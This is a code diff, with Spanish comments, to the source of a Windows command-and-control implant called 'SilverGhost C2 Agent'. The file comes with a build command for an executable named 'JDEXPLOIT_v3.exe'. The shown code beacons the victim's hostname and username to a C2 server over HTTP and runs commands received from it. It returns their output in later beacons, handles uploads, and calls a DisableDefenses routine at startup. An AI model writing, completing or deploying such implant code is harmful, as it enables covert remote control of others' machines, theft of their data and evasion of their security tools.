@@ -1,5 +1,6 @@
 /*
- * SilverGhost C2 Agent v3.2 - CON OUTPUT
+ * SilverGhost C2 Agent v3.3 - CON OUTPUT FUNCIONAL
+ * Compilación: x86_64-w64-mingw32-g++ -O2 -s -static -mwindows -o JDEXPLOIT_v3.exe agent.cpp -lwininet -ladvapi32 -lcrypt32
  */
 
 #define WIN32_LEAN_AND_MEAN
@@ -134,7 +135,7 @@ bool HandleUpload(const std::string& response) {
     return false;
 }
 
-// ========== BEACON CON OUTPUT ==========
+// ========== BEACON CON OUTPUT FUNCIONAL ==========
 void Beacon() {
     HINTERNET hSession = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hSession) return;
@@ -145,7 +146,7 @@ void Beacon() {
     size = sizeof(username);
     GetUserNameA(username, &size);
     
-    std::string output_buffer;  // Buffer para guardar output de comandos
+    std::string pending_output;
     
     while (true) {
         HINTERNET hConnect = InternetConnectA(hSession, C2_SERVER, C2_PORT, NULL, NULL, 
@@ -154,17 +155,19 @@ void Beacon() {
             HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/", NULL, NULL, NULL, 
                                                   INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD, 0);
             if (hRequest) {
-                // Enviar beacon (incluir output pendiente si existe)
+                // Construir beacon con output si existe
                 std::string beacon_data = std::string(hostname) + "|" + username + "|Windows";
-                if (!output_buffer.empty()) {
-                    beacon_data += "|OUTPUT:" + output_buffer;
-                    output_buffer.clear();
+                
+                if (!pending_output.empty()) {
+                    std::string output_to_send = pending_output.substr(0, 2000);  // Limitar tamaño
+                    beacon_data += "|OUTPUT_START|" + output_to_send + "|OUTPUT_END|";
+                    pending_output.clear();
                 }
                 
                 HttpSendRequestA(hRequest, "Content-Type: text/plain\r\n", -1, 
                                 (LPVOID)beacon_data.c_str(), beacon_data.length());
                 
-                char buffer[32768];
+                char buffer[16384];
                 DWORD bytesRead;
                 std::string response;
                 
@@ -183,9 +186,9 @@ void Beacon() {
                 if (response.find("FromBase64String") != std::string::npos) {
                     HandleUpload(response);
                 }
-                // Ejecutar comando normal y guardar output
+                // Ejecutar comando normal
                 else if (!response.empty() && response.find("JDEXPLOIT_ACTIVE") == std::string::npos) {
-                    output_buffer = ExecuteCommand(response);
+                    pending_output = ExecuteCommand(response);
                 }
                 
                 InternetCloseHandle(hRequest);
@@ -197,7 +200,7 @@ void Beacon() {
     InternetCloseHandle(hSession);
 }
 
-// ========== ENTRY ==========
+// ========== ENTRY POINT ==========
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     Sleep(2000);
     DisableDefenses();
